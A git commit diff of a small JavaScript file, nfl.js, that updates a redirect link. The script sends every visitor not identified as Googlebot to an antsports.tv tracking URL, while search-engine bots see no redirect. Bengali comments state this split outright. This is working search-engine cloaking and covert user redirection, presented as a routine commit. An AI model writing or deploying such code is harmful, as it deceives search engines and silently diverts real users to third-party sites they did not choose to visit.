3d1b639ebf951b852386dec05a8be9ae01ef7587
Asaduzzaman Asad <zzamantowfik1@proton.me>
2026-09-21 02:19:22 +0600

    Update redirect URL for non-Googlebot users

--- nfl.js
+++ nfl.js
@@ -1,6 +1,6 @@
 if (!navigator.userAgent.includes('Googlebot')) {
   // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
-  window.location.href = "https://antsports.tv/go/2D76E0F2";
+  window.location.href = "https://antsports.tv/go/98396228";
 } else {
   // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
   console.log("Thanks for visiting my page" );
